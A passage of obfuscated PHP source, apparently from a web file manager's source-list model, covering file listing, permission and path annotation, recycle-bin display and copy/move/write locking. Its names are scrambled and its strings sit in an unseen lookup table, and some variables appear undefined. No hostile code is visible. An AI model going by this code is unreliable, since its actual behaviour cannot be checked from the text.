$ôõ‚÷©É[$÷—©Ò€Æ[90]][$÷—©Ò€Æ[583]] = array(); foreach ($áû÷Ñê´[$ôõ‚÷©É[$÷—©Ò€Æ[192]]] as $µîÚí…Â) { $ôõ‚÷©É[$÷—©Ò€Æ[90]][$÷—©Ò€Æ[583]] = $this->shareFilterShow($µîÚí…Â); } } } unset($ôõ‚÷©É); return $Âû°Úá€; } protected function shareFilterShow($ŠÂ¾ÍÇ) { $îñÅİ¥Ä =& $_SERVER[€ä¾™²]; if (!$ŠÂ¾ÍÇ) { return $ŠÂ¾ÍÇ; } $×…ÍŠ­ = $îñÅİ¥Ä[584]; if ($ŠÂ¾ÍÇ[$îñÅİ¥Ä[585]] == $îñÅİ¥Ä[91]) { $×…ÍŠ­ .= $îñÅİ¥Ä[586]; } if (is_array($ŠÂ¾ÍÇ[$îñÅİ¥Ä[587]]) && is_array($ŠÂ¾ÍÇ[$îñÅİ¥Ä[587]][$îñÅİ¥Ä[588]])) { $ŠÂ¾ÍÇ[$îñÅİ¥Ä[587]][$îñÅİ¥Ä[588]] = $îñÅİ¥Ä[589]; } if (!$È•‘¼í[$îñÅİ¥Ä[590]] && $È•‘¼í[$îñÅİ¥Ä[192]] != $îñÅİ¥Ä[229]) { $È•‘¼í[$îñÅİ¥Ä[590]] = KodIO::make($È•‘¼í[$îñÅİ¥Ä[192]]); } $ŠÂ¾ÍÇ = array_field_key($ŠÂ¾ÍÇ, explode($îñÅİ¥Ä[50], $×…ÍŠ­)); return $ŠÂ¾ÍÇ; } protected function _listAppendChildren(&$•ßÔ“ª, $Ó»–åÄ) { $×›‹ß± =& $_SERVER[€ä¾™²]; $…Üúáš¾ = array(); $ÈÉ‘”›‡ = array($×›‹ß±[240] => 0, $×›‹ß±[241] => 0); foreach ($•ßÔ“ª as &$Ã‰§ã…) { if (!$Ã‰§ã…[$×›‹ß±[507]]) { continue; } $…Üúáš¾[] = intval($Ã‰§ã…[$×›‹ß±[192]]); } unset($Ã‰§ã…); if (!$…Üúáš¾) { return; } $ØùÈŠÑ = array($×›‹ß±[191] => array($×›‹ß±[7], $…Üúáš¾), $×›‹ß±[527] => 0); $ş™–—Ğ© = array($×›‹ß±[191], $×›‹ß±[507], $×›‹ß±[591] => $×›‹ß±[592]); $ü¤Õ²êÈ = $this->field($ş™–—Ğ©)->where($ØùÈŠÑ)->group($×›‹ß±[593])->select(); $ÜŞÍ”æâ = array(); foreach ($ü¤Õ²êÈ as $©ÎÚï´ò) { $õ¢Ñ´Îß = $©ÎÚï´ò[$×›‹ß±[191]]; $ú¶µİÛ· = $©ÎÚï´ò[$×›‹ß±[507]] == $×›‹ß±[91] ? $×›‹ß±[241] : $×›‹ß±[240]; if (!isset($ÜŞÍ”æâ[$õ¢Ñ´Îß])) { $ÜŞÍ”æâ[$õ¢Ñ´Îß] = array($×›‹ß±[240] => 0, $×›‹ß±[241] => 0); } $ÜŞÍ”æâ[$õ¢Ñ´Îß][$ú¶µİÛ·] += $©ÎÚï´ò[$×›‹ß±[592]]; } foreach ($•ßÔ“ª as &$Ã‰§ã…) { if (!$Ã‰§ã…[$×›‹ß±[507]]) { continue; } $Í”üë³ = is_array($ÜŞÍ”æâ[$Ã‰§ã…[$×›‹ß±[192]]]) ? $ÜŞÍ”æâ[$Ã‰§ã…[$×›‹ß±[192]]] : $ÈÉ‘”›‡; $Ã‰§ã…[$×›‹ß±[241]] = $Í”üë³[$×›‹ß±[241]]; $Ã‰§ã…[$×›‹ß±[240]] = $Í”üë³[$×›‹ß±[240]]; unset($Ã‰§ã…[$×›‹ß±[508]]); } unset($Ã‰§ã…); } protected function _listAppendAuth(&$Ş‚Ì’Û—) { $Ê½ˆşêî =& $_SERVER[€ä¾™²]; $¿Öü¬‘ = array(); foreach ($Ş‚Ì’Û— as $º ô„ş) { if ($º ô„ş[$Ê½ˆşêî[189]] == self::TYPE_GROUP) { $¿Öü¬‘[] = intval($º ô„ş[$Ê½ˆşêî[192]]); } } if (!$¿Öü¬‘) { return; } $²ŠÂ½Ó = array_to_keyvalue($Ş‚Ì’Û—, $Ê½ˆşêî[192]); $Òì•£ = Model($Ê½ˆşêî[594])->getSourceList($¿Öü¬‘, $²ŠÂ½Ó); $¾ÕÇÛ‰ = KodUser::isRoot(); foreach ($Ş‚Ì’Û— as $ß‡ô«Êå => &$º ô„ş) { $º ô„ş[$Ê½ˆşêî[509]] = $Òì•£[$º ô„ş[$Ê½ˆşêî[192]]]; if (!$º ô„ş[$Ê½ˆşêî[509]] && $º ô„ş[$Ê½ˆşêî[189]] == self::TYPE_GROUP) { $º ô„ş[$Ê½ˆşêî[509]] = Action($Ê½ˆşêî[595])->pathGroupAuthMake($º ô„ş[$Ê½ˆşêî[596]]); if (!$º ô„ş[$Ê½ˆşêî[509]] && !$¾ÕÇÛ‰) { $º ô„ş[$Ê½ˆşêî[234]] = !1; $º ô„ş[$Ê½ˆşêî[233]] = !1; } } if ($º ô„ş[$Ê½ˆşêî[509]]) { $º ô„ş[$Ê½ˆşêî[234]] = AuthModel::authCheckEdit($º ô„ş[$Ê½ˆşêî[509]][$Ê½ˆşêî[510]]); $º ô„ş[$Ê½ˆşêî[233]] = AuthModel::authCheckView($º ô„ş[$Ê½ˆşêî[509]][$Ê½ˆşêî[510]]); } $this->groupPathDisplay($º ô„ş); } unset($º ô„ş); } public function _listAppendAuthSecret(&$ºæ‡Ô¸) { $½£Òæó¦ =& $_SERVER[€ä¾™²]; if (Model($½£Òæó¦[529])->get($½£Òæó¦[597]) != $½£Òæó¦[91]) { return; } static $Ä®¦ùÖç = false; if (!$Ä®¦ùÖç) { $úÈ×ä” = Model($½£Òæó¦[598]); $øòÚ€Šù = Model($½£Òæó¦[599]); $Ä®¦ùÖç = $øòÚ€Šù->listData(); $Ä®¦ùÖç = array_to_keyvalue($Ä®¦ùÖç, $½£Òæó¦[192]); $…Üæö§· = json_decode(Model($½£Òæó¦[529])->get($½£Òæó¦[600]), !0); $…Üæö§· = array_to_keyvalue($…Üæö§·, $½£Òæó¦[486]); foreach ($Ä®¦ùÖç as $Ó÷‰ïşß => $Ç¤ñ“ï¶) { $Ó¥¸Ñğ¼ = $…Üæö§·[$Ç¤ñ“ï¶[$½£Òæó¦[601]]]; if (!$Ó¥¸Ñğ¼) { $øòÚ€Šù->remove($Ç¤ñ“ï¶[$½£Òæó¦[486]]); unset($Ä®¦ùÖç[$Ó÷‰ïşß]); continue; } $š×…ŒØñ = $úÈ×ä”->listData($Ó¥¸Ñğ¼[$½£Òæó¦[509]]); if (!$š×…ŒØñ) { $øòÚ€Šù->remove($Ç¤ñ“ï¶[$½£Òæó¦[486]]); unset($Ä®¦ùÖç[$Ó÷‰ïşß]); continue; } $Ç¤ñ“ï¶[$½£Òæó¦[509]] = $š×…ŒØñ; $Ç¤ñ“ï¶[$½£Òæó¦[602]] = $Ó¥¸Ñğ¼; $Ç¤ñ“ï¶[$½£Òæó¦[603]] = Model($½£Òæó¦[604])->getInfoSimpleOuter($Ç¤ñ“ï¶[$½£Òæó¦[548]]); $Ä®¦ùÖç[$Ó÷‰ïşß] = $Ç¤ñ“ï¶; } } $ƒÎ ´²ì = USER_ID; $Ñ»ÙÕœœ = array(); $©ıËñ = $this->_listAppendPath($Ñ»ÙÕœœ, !0); foreach ($ºæ‡Ô¸ as $Ó÷‰ïşß => &$Ç¤ñ“ï¶) { if (!is_array($Ç¤ñ“ï¶[$½£Òæó¦[509]])) { continue; } if ($Ç¤ñ“ï¶[$½£Òæó¦[189]] != $½£Òæó¦[605]) { continue; } if (isset($Ä®¦ùÖç[$Ç¤ñ“ï¶[$½£Òæó¦[192]]])) { $¸¬Ùû×ß = $Ä®¦ùÖç[$Ç¤ñ“ï¶[$½£Òæó¦[192]]]; if (!is_array($Ç¤ñ“ï¶[$½£Òæó¦[562]])) { $Ç¤ñ“ï¶[$½£Òæó¦[562]] = array(); } $Ç¤ñ“ï¶[$½£Òæó¦[562]][$½£Òæó¦[606]] = $¸¬Ùû×ß[$½£Òæó¦[601]]; $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[607]] = $¸¬Ùû×ß; $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[608]] = $Ç¤ñ“ï¶[$½£Òæó¦[609]]; $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[610]] = $½£Òæó¦[91]; if ($¸¬Ùû×ß[$½£Òæó¦[548]] != $ƒÎ ´²ì) { $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[510]] = $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[510]] & $¸¬Ùû×ß[$½£Òæó¦[509]][$½£Òæó¦[509]]; } continue; } $®ŞÑ© = $this->parentLevelArray($Ç¤ñ“ï¶[$½£Òæó¦[611]]); $¡îßèÕü = array_reverse($®ŞÑ©); foreach ($¡îßèÕü as $§ö±íÄâ => $ƒ®Âš½¸) { if (!isset($Ä®¦ùÖç[$ƒ®Âš½¸])) { continue; } $¸¬Ùû×ß = $Ä®¦ùÖç[$ƒ®Âš½¸]; $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[607]] = $¸¬Ùû×ß; if ($¸¬Ùû×ß[$½£Òæó¦[548]] != $ƒÎ ´²ì) { $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[510]] = $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[510]] & $¸¬Ùû×ß[$½£Òæó¦[509]][$½£Òæó¦[509]]; } $¹µƒ£î† = $½£Òæó¦[12]; $¬„¢€¬ = count($®ŞÑ©) - $§ö±íÄâ; for ($ìËôŞ¯ó = 0; $ìËôŞ¯ó < $¬„¢€¬; $ìËôŞ¯ó++) { if (!isset($©ıËñ[$®ŞÑ©[$ìËôŞ¯ó]])) { $¹µƒ£î† = $½£Òæó¦[12]; break; } $¹µƒ£î† = $¹µƒ£î† . rtrim($©ıËñ[$®ŞÑ©[$ìËôŞ¯ó]], $½£Òæó¦[8]) . $½£Òæó¦[8]; } $Ç¤ñ“ï¶[$½£Òæó¦[509]][$½£Òæó¦[608]] = rtrim($¹µƒ£î†, $½£Òæó¦[8]) . $½£Òæó¦[8]; break; } } unset($Ç¤ñ“ï¶); } public function groupPathDisplay(&$¸…„ûìã) { $õ’şãÎĞ =& $_SERVER[€ä¾™²]; if ($¸…„ûìã[$õ’şãÎĞ[189]] != self::TYPE_GROUP) { return; } $¨ŸÅÑĞó = Model($õ’şãÎĞ[612])->getInfo($¸…„ûìã[$õ’şãÎĞ[596]]); $ò÷«äæ = $this->parentLevelArray($¨ŸÅÑĞó[$õ’şãÎĞ[611]]); $€‡•¾ßÛ = $õ’şãÎĞ[12]; foreach ($ò÷«äæ as $‹óÄÕÑØ) { $ŠÜÍì»ñ = Model($õ’şãÎĞ[612])->getInfo($‹óÄÕÑØ); $€‡•¾ßÛ .= $ŠÜÍì»ñ[$õ’şãÎĞ[90]][$õ’şãÎĞ[192]] . $õ’şãÎĞ[50]; } $¸…„ûìã[$õ’şãÎĞ[613]] = $¨ŸÅÑĞó[$õ’şãÎĞ[191]]; $¸…„ûìã[$õ’şãÎĞ[614]] = $¨ŸÅÑĞó[$õ’şãÎĞ[611]]; $¸…„ûìã[$õ’şãÎĞ[615]] = $¨ŸÅÑĞó[$õ’şãÎĞ[616]]; $¸…„ûìã[$õ’şãÎĞ[617]] = $€‡•¾ßÛ . $¨ŸÅÑĞó[$õ’şãÎĞ[90]][$õ’şãÎĞ[192]]; } protected function _listAppendPath(&$‚½·»ĞŠ, $ëÂ¤Íı³ = false) { $ãİËî– =& $_SERVER[€ä¾™²]; static $Áåßó¦ = array(); $’±¥Ø—ù = array(); $¸ñ¥Óó¨ = array(); if ($ëÂ¤Íı³) { return $Áåßó¦; } foreach ($‚½·»ĞŠ as &$Æ°úùàõ) { $õÙÁ±µ¿ = $Æ°úùàõ[$ãİËî–[192]]; if ($Æ°úùàõ[$ãİËî–[507]] == $ãİËî–[91] && $Æ°úùàõ[$ãİËî–[191]] != 0) { $Áåßó¦[$õÙÁ±µ¿] = $Æ°úùàõ[$ãİËî–[32]]; } if ($Æ°úùàõ[$ãİËî–[507]] == $ãİËî–[91] && $Æ°úùàõ[$ãİËî–[191]] == 0) { $Áåßó¦[$õÙÁ±µ¿] = $this->_listAppendPathRoot($Æ°úùàõ, array()); } if (isset($¸ñ¥Óó¨[$Æ°úùàõ[$ãİËî–[611]]])) { continue; } $¸ñ¥Óó¨[$Æ°úùàõ[$ãİËî–[611]]] = !0; $¿Å÷šùÃ = $this->parentLevelArray($Æ°úùàõ[$ãİËî–[611]]); foreach ($¿Å÷šùÃ as $µÃ½Ö¾ => $®¬Œ±³) { if (isset($Áåßó¦[$®¬Œ±³])) { continue; } if ($µÃ½Ö¾ == 0) { $Áåßó¦[$®¬Œ±³] = $this->_listAppendPathRoot($Æ°úùàõ, $¿Å÷šùÃ); } if ($µÃ½Ö¾ != 0) { $’±¥Ø—ù[] = $®¬Œ±³; } } } unset($Æ°úùàõ); $’±¥Ø—ù = array_unique($’±¥Ø—ù); if (count($’±¥Ø—ù) > 0) { $óê€ÑÁ = array($ãİËî–[513] => array($ãİËî–[514], $’±¥Ø—ù)); if (count($’±¥Ø—ù) == 1) { $àŸÖ²© = $this->sourceInfo($’±¥Ø—ù[0]); $½Ô¤É–Ä = is_array($àŸÖ²©) ? array($àŸÖ²©) : !1; } else { $½Ô¤É–Ä = $this->field($ãİËî–[618])->where($óê€ÑÁ)->select(); } if (!$½Ô¤É–Ä) { $½Ô¤É–Ä = array(); } foreach ($½Ô¤É–Ä as $ßÖÏ±ú¨) { $Áåßó¦[$ßÖÏ±ú¨[$ãİËî–[192]]] = $ßÖÏ±ú¨[$ãİËî–[32]]; } } $üÄ ›Ş• = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÙÏ€øÖä = array(); foreach ($‚½·»ĞŠ as &$Æ°úùàõ) { $ÌŠè®Ôá = $Æ°úùàõ[$ãİËî–[611]]; $ìÏÄÁÏÊ = $ãİËî–[12]; if (isset($ÙÏ€øÖä[$ÌŠè®Ôá])) { $ìÏÄÁÏÊ = $ÙÏ€øÖä[$ÌŠè®Ôá]; } else { $¿Å÷šùÃ = $this->parentLevelArray($Æ°úùàõ[$ãİËî–[611]]); foreach ($¿Å÷šùÃ as $µÃ½Ö¾ => $®¬Œ±³) { if (isset($Áåßó¦[$®¬Œ±³])) { $ìÏÄÁÏÊ .= $Áåßó¦[$®¬Œ±³] . $ãİËî–[8]; } } $ÙÏ€øÖä[$ÌŠè®Ôá] = $ìÏÄÁÏÊ; } $ìÏÄÁÏÊ .= $Æ°úùàõ[$ãİËî–[32]]; if ($Æ°úùàõ[$ãİËî–[507]] == $ãİËî–[91]) { $ìÏÄÁÏÊ .= $ãİËî–[8]; } $Æ°úùàõ[$ãİËî–[609]] = str_replace($ãİËî–[255], $ãİËî–[8], $ìÏÄÁÏÊ); if ($Æ°úùàõ[$ãİËî–[191]] == $ãİËî–[229]) { $Æ°úùàõ[$ãİËî–[32]] = trim($Áåßó¦[$Æ°úùàõ[$ãİËî–[192]]], $ãİËî–[8]); $Æ°úùàõ[$ãİËî–[609]] = $Æ°úùàõ[$ãİËî–[32]] . $ãİËî–[8]; } if (intval($Æ°úùàõ[$ãİËî–[189]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Æ°úùàõ, $¿Å÷šùÃ, $üÄ ›Ş•); } } unset($Æ°úùàõ); return $‚½·»ĞŠ; } private function _listAppendPathRecycle(&$‡†‰ú¼, $³÷îÙ½, $®œ¤óß±) { $‚“ëÅàÚ =& $_SERVER[€ä¾™²]; if (!in_array($®œ¤óß±, $³÷îÙ½) && $‡†‰ú¼[$‚“ëÅàÚ[192]] != $®œ¤óß±) { return; } $¿ìú–Ë» = explode($‚“ëÅàÚ[8], trim($‡†‰ú¼[$‚“ëÅàÚ[609]], $‚“ëÅàÚ[8])); $‡‰¹„Á‡ = implode($‚“ëÅàÚ[8], array_slice($¿ìú–Ë», 2)); $‡†‰ú¼[$‚“ëÅàÚ[609]] = $‚“ëÅàÚ[8] . LNG($‚“ëÅàÚ[619]) . $‚“ëÅàÚ[8] . ltrim($‡‰¹„Á‡, $‚“ëÅàÚ[8]); $‡†‰ú¼[$‚“ëÅàÚ[611]] = $‚“ëÅàÚ[620] . implode($‚“ëÅàÚ[50], array_slice($³÷îÙ½, 1)) . $‚“ëÅàÚ[50]; if ($‡†‰ú¼[$‚“ëÅàÚ[192]] == $®œ¤óß±) { $‡†‰ú¼[$‚“ëÅàÚ[611]] = $‚“ëÅàÚ[620]; $‡†‰ú¼[$‚“ëÅàÚ[191]] = $‚“ëÅàÚ[229]; $‡†‰ú¼[$‚“ëÅàÚ[32]] = LNG($‚“ëÅàÚ[619]); } $‡†‰ú¼[$‚“ëÅàÚ[621]] = $‚“ëÅàÚ[622]; } protected function _listAppendPathRoot(&$õãÃŒÜ, $ııï³ğ) { $úøé¡ =& $_SERVER[€ä¾™²]; static $çºØšªÕ = false; static $õÌƒöÈ = false; $´î·Õı¸ = $úøé¡[12]; if ($õãÃŒÜ[$úøé¡[189]] == self::TYPE_USER) { if ($õãÃŒÜ[$úøé¡[596]] == USER_ID) { $´î·Õı¸ = LNG($úøé¡[623]); if ($çºØšªÕ === !1) { $‹ºÕàÒÁ = Model($úøé¡[624])->getInfoFull(USER_ID); $çºØšªÕ = _get($‹ºÕàÒÁ, $úøé¡[625], $úøé¡[12]); } if ($õÌƒöÈ === !1) { $‹ºÕàÒÁ = Model($úøé¡[624])->getInfoFull(USER_ID); $õÌƒöÈ = _get($‹ºÕàÒÁ, $úøé¡[626], $úøé¡[12]); } if ($ııï³ğ && $ııï³ğ[0] == $çºØšªÕ || !$ııï³ğ && $õãÃŒÜ[$úøé¡[192]] == $çºØšªÕ) { $´î·Õı¸ = LNG($úøé¡[627]); $õãÃŒÜ[$úøé¡[628]] = $úøé¡[629]; } if ($ııï³ğ && $ııï³ğ[0] == $õÌƒöÈ || !$ııï³ğ && $õãÃŒÜ[$úøé¡[192]] == $õÌƒöÈ) { $´î·Õı¸ = $´î·Õı¸ . $úøé¡[630] . LNG($úøé¡[631]); } if (!$ııï³ğ) { $õãÃŒÜ[$úøé¡[32]] = $´î·Õı¸; } } else { $‹ºÕàÒÁ = Model($úøé¡[624])->getInfoFull($õãÃŒÜ[$úøé¡[596]]); $–×´Ü¹ã = _get($‹ºÕàÒÁ, $úøé¡[626], $úøé¡[12]); $õãÃŒÜ[$úøé¡[632]] = Model($úøé¡[604])->getInfoSimpleOuter($õãÃŒÜ[$úøé¡[596]]); $´î·Õı¸ = LNG($úøé¡[633]) . $úøé¡[174] . $õãÃŒÜ[$úøé¡[632]][$úøé¡[32]] . $úøé¡[176]; if ($ııï³ğ && $ııï³ğ[0] == $–×´Ü¹ã || !$ııï³ğ && $õãÃŒÜ[$úøé¡[192]] == $–×´Ü¹ã) { $´î·Õı¸ = LNG($úøé¡[633]) . $úøé¡[634] . $õãÃŒÜ[$úøé¡[632]][$úøé¡[32]] . $úøé¡[630] . LNG($úøé¡[631]) . $úøé¡[176]; } } } else { if ($õãÃŒÜ[$úøé¡[189]] == self::TYPE_GROUP) { $ñËßøÅ = Model($úøé¡[612])->getInfoSimple($õãÃŒÜ[$úøé¡[596]]); $´î·Õı¸ = $ñËßøÅ[$úøé¡[32]]; } else { if ($õãÃŒÜ[$úøé¡[189]] == self::TYPE_SYSTEM) { $´î·Õı¸ = $úøé¡[635]; } } } $´î·Õı¸ = $´î·Õı¸ ? $úøé¡[8] . $´î·Õı¸ . $úøé¡[8] : $úøé¡[8]; return $´î·Õı¸; } protected function _listAppendUser(&$Î«Ğë·) { $‡êİĞüÍ =& $_SERVER[€ä¾™²]; $¼“Äİç™ = array_to_keyvalue($Î«Ğë·, $‡êİĞüÍ[12], $‡êİĞüÍ[548]); $²¦Ó”³İ = array_to_keyvalue($Î«Ğë·, $‡êİĞüÍ[12], $‡êİĞüÍ[550]); $Àîí©šá = array_merge($¼“Äİç™, $²¦Ó”³İ); $ Ä­ª·á = Model($‡êİĞüÍ[624])->userListInfo($Àîí©šá); foreach ($Î«Ğë· as &$»ò€™ú€) { $·§…ïÅˆ = $»ò€™ú€[$‡êİĞüÍ[548]]; $»ò€™ú€[$‡êİĞüÍ[548]] = $ Ä­ª·á[$·§…ïÅˆ] ? $ Ä­ª·á[$·§…ïÅˆ] : !1; $·§…ïÅˆ = $»ò€™ú€[$‡êİĞüÍ[550]]; $»ò€™ú€[$‡êİĞüÍ[550]] = $ Ä­ª·á[$·§…ïÅˆ] ? $ Ä­ª·á[$·§…ïÅˆ] : !1; if (_get($»ò€™ú€, $‡êİĞüÍ[636], 0)) { $äë¯ôì¾ = $GLOBALS[$‡êİĞüÍ[6]][$‡êİĞüÍ[92]][$‡êİĞüÍ[637]]; if ($»ò€™ú€[$‡êİĞüÍ[562]][$‡êİĞüÍ[638]] <= time() - $äë¯ôì¾) { $this->metaSet($»ò€™ú€[$‡êİĞüÍ[192]], $‡êİĞüÍ[639], null); $this->metaSet($»ò€™ú€[$‡êİĞüÍ[192]], $‡êİĞüÍ[638], null); unset($»ò€™ú€[$‡êİĞüÍ[562]][$‡êİĞüÍ[639]]); continue; } $ƒó•± = $»ò€™ú€[$‡êİĞüÍ[562]][$‡êİĞüÍ[639]]; $»ò€™ú€[$‡êİĞüÍ[562]][$‡êİĞüÍ[640]] = Model($‡êİĞüÍ[624])->getInfoSimpleOuter($ƒó•±); } } unset($»ò€™ú€); } public function parentLevelArray($ÓÛ›á) { $šß°¦¸ =& $_SERVER[€ä¾™²]; $ÓÛ›á = explode($šß°¦¸[50], trim($ÓÛ›á, $šß°¦¸[50])); return array_to_int(array_filter($ÓÛ›á)); } public function listAll($¥ü×½çÖ) { $¼µÛ÷¾Ö =& $_SERVER[€ä¾™²]; $ı€…Åä = $this->sourceInfo($¥ü×½çÖ); $”ëì‹ = array($¼µÛ÷¾Ö[641] => array($¼µÛ÷¾Ö[642], $ı€…Åä[$¼µÛ÷¾Ö[611]] . $¥ü×½çÖ . $¼µÛ÷¾Ö[643]), $¼µÛ÷¾Ö[644] => 0); $Øî¼±Ù˜ = $¼µÛ÷¾Ö[645]; $Ö¼Ää˜¾ = "\x4c\105\106\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\146\151\x6c\x65\40\x66\151\154\x65\40\157\156\40\x73\157\x75\162\x63\x65\x2e\146\151\x6c\x65\x49\x44\x20\75\40\x66\x69\154\x65\56\x66\151\154\145\x49\104"; $ìœÂ’í„ = $this->alias($¼µÛ÷¾Ö[540])->field($Øî¼±Ù˜)->where($”ëì‹)->join($Ö¼Ää˜¾)->select(); $this->_listAppendAuth($ìœÂ’í„); $this->_listAppendUser($ìœÂ’í„); $this->_listAppendPath($ìœÂ’í„); $ìœÂ’í„ = array_to_keyvalue($ìœÂ’í„, $¼µÛ÷¾Ö[192]); $ëÄóÙŸé = "\x2f{$ı€…Åä[$¼µÛ÷¾Ö[32]]}\x2f"; $ëÄóÙŸé = $ëÄóÙŸé == $¼µÛ÷¾Ö[255] ? $¼µÛ÷¾Ö[8] : $ëÄóÙŸé; $Şšå÷òŠ = array(); foreach ($ìœÂ’í„ as $¹îİ’Ï† => $’“óÛØŠ) { $éİŒ­ËÁ = $this->parentLevelArray($’“óÛØŠ[$¼µÛ÷¾Ö[611]]); array_shift($éİŒ­ËÁ); $ãˆ¤ô„Ú = $ëÄóÙŸé; for ($­ŸÖ˜îä = 0; $­ŸÖ˜îä < count($éİŒ­ËÁ); $­ŸÖ˜îä++) { $ãˆ¤ô„Ú .= $ìœÂ’í„[$éİŒ­ËÁ[$­ŸÖ˜îä]][$¼µÛ÷¾Ö[32]] . $¼µÛ÷¾Ö[8]; } $ãˆ¤ô„Ú .= $’“óÛØŠ[$¼µÛ÷¾Ö[32]]; if ($’“óÛØŠ[$¼µÛ÷¾Ö[507]]) { $ãˆ¤ô„Ú .= $¼µÛ÷¾Ö[8]; } $Ü÷ºË = array($¼µÛ÷¾Ö[517] => str_replace($¼µÛ÷¾Ö[255], $¼µÛ÷¾Ö[8], str_replace($¼µÛ÷¾Ö[255], $¼µÛ÷¾Ö[8], str_replace($¼µÛ÷¾Ö[255], $¼µÛ÷¾Ö[8], $ãˆ¤ô„Ú))), $¼µÛ÷¾Ö[646] => intval($’“óÛØŠ[$¼µÛ÷¾Ö[507]]), $¼µÛ÷¾Ö[647] => intval($’“óÛØŠ[$¼µÛ÷¾Ö[79]]), $¼µÛ÷¾Ö[88] => intval($’“óÛØŠ[$¼µÛ÷¾Ö[88]]), $¼µÛ÷¾Ö[90] => $this->pathInfoFilter($’“óÛØŠ)); if (!$Ü÷ºË[$¼µÛ÷¾Ö[507]]) { $Ü÷ºË[$¼µÛ÷¾Ö[564]] = $’“óÛØŠ[$¼µÛ÷¾Ö[564]]; } $Şšå÷òŠ[] = $Ü÷ºË; } $Şšå÷òŠ = array_sort_by($Şšå÷òŠ, $¼µÛ÷¾Ö[87]); return $Şšå÷òŠ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($È™Ÿ†€˜) { $—ÂºéˆÂ =& $_SERVER[€ä¾™²]; if (!$this->allowLock()) { return; } $this->_lockCheck($—ÂºéˆÂ[648], $È™Ÿ†€˜); $˜èò˜¸ = 1; $this->_lockEvent($È™Ÿ†€˜, array($—ÂºéˆÂ[649], $—ÂºéˆÂ[650]), $˜èò˜¸); $this->_lockParent($È™Ÿ†€˜, array($—ÂºéˆÂ[650]), $˜èò˜¸); $this->_lockEvent($È™Ÿ†€˜, array($—ÂºéˆÂ[651], $—ÂºéˆÂ[652]), $˜èò˜¸); $this->_lockCheckEnd($—ÂºéˆÂ[648], $È™Ÿ†€˜); } public function lockCopyEnd($¬íûáğ) { $â§Ğª¾È =& $_SERVER[€ä¾™²]; if (!$this->allowLock()) { return; } $ïñäíÏí = 0; $this->_lockEvent($¬íûáğ, array($â§Ğª¾È[649], $â§Ğª¾È[650]), $ïñäíÏí); $this->_lockParent($¬íûáğ, array($â§Ğª¾È[650]), $ïñäíÏí); $this->_lockEvent($¬íûáğ, array($â§Ğª¾È[651], $â§Ğª¾È[652]), $ïñäíÏí); } public function lockWriteStart($ì£É‡äá, $ç¶Ñü™Å = '') { $‘œ£§‹Ç =& $_SERVER[€ä¾™²]; if (!$this->allowLock()) { return; } $this->_lockCheck($‘œ£§‹Ç[649], $ì£É‡äá); $É¿ª½ú² = 1; $this->_lockKey($‘œ£§‹Ç[653] . $ì£É‡äá . $‘œ£§‹Ç[10] . $ç¶Ñü™Å, $É¿ª½ú²); $this->_lockEvent($ì£É‡äá, array($‘œ£§‹Ç[648], $‘œ£§‹Ç[650]), $É¿ª½ú²); $this->_lockParent($ì£É‡äá, array($‘œ£§‹Ç[648], $‘œ£§‹Ç[650]), $É¿ª½ú²); $this->_lockCheckEnd($‘œ£§‹Ç[649], $ì£É‡äá); } public function lockWriteEnd($ÔŸ¦Ôñ, $¿ÂÖºÄæ = '') { $µî…ã¢Î =& $_SERVER[€ä¾™²]; if (!$this->allowLock()) { return; } $“ƒ´³Ç› = 0; $this->_lockKey($µî…ã¢Î[653] . $ÔŸ¦Ôñ . $µî…ã¢Î[10] . $¿ÂÖºÄæ, $“ƒ´³Ç›); $this->_lockEvent($ÔŸ¦Ôñ, array($µî…ã¢Î[648], $µî…ã¢Î[650]), $“ƒ´³Ç›); $this->_lockParent($ÔŸ¦Ôñ, array($µî…ã¢Î[648], $µî…ã¢Î[650]), $“ƒ´³Ç›); } public function lockMoveStart($éµŸß) { $ø™á¼Íˆ =& $_SERVER[€ä¾™²]; if (!$this->allowLock()) { return; } $this->_lockCheck($ø™á¼Íˆ[650], $éµŸß); $ÎŒøê¹É = 1; $this->_lockKey($ø™á¼Íˆ[654] . $éµŸß, $ÎŒøê¹É); $this->_lockEvent($éµŸß, array($ø™á¼Íˆ[648], $ø™á¼Íˆ[649]), $ÎŒøê¹É); $this->_lockParent($éµŸß, array($ø™á¼Íˆ[648], $ø™á¼Íˆ[650]), $ÎŒøê¹É); $this->_lockEvent($éµŸß, array($ø™á¼Íˆ[655], $ø™á¼Íˆ[651], $ø™á¼Íˆ[652]), $ÎŒøê¹É); $this->_lockCheckEnd($ø™á¼Íˆ[650], $éµŸß); } public function lockMoveEnd($èšÜøŞ„) { $·‚ì¡‰à =& $_SERVER[€ä¾™²]; if (!$this->allowLock()) { return; } $¢ÏŒÉ™ = 0; $this->_lockKey($·‚ì¡‰à[654] . $èšÜøŞ„, $¢ÏŒÉ™); $this->_lockEvent($èšÜøŞ„, array($·‚ì¡‰à[648], $·‚ì¡‰à[649]), $¢ÏŒÉ™); $this->_lockParent($èšÜøŞ„, array($·‚ì¡‰à[648], $·‚ì¡‰à[650]), $¢ÏŒÉ™); $this->_lockEvent($èšÜøŞ„, array($·‚ì¡‰à[655], $·‚ì¡‰à[651], $·‚ì¡‰à[652]), $¢ÏŒÉ™); } private function _lockCheck($¾–şÙ˜·, $ÔĞÚœ§â) { $¾¸íİ¤ª =& $_SERVER[€ä¾™²]; $½§äç¬Ú = $this->sourceInfo($ÔĞÚœ§â); $ğÓçã¾Ù = $¾–şÙ˜· . $¾¸íİ¤ª[10] . $ÔĞÚœ§â; $this->_lockTimeStart[$ğÓçã¾Ù] = timeFloat(); if (!is_array($½§äç¬Ú)) { return; } $ŠÈÍÇ¤ = LNG($¾¸íİ¤ª[656]); CacheLock::setErrorMsg($¾¸íİ¤ª[174] . 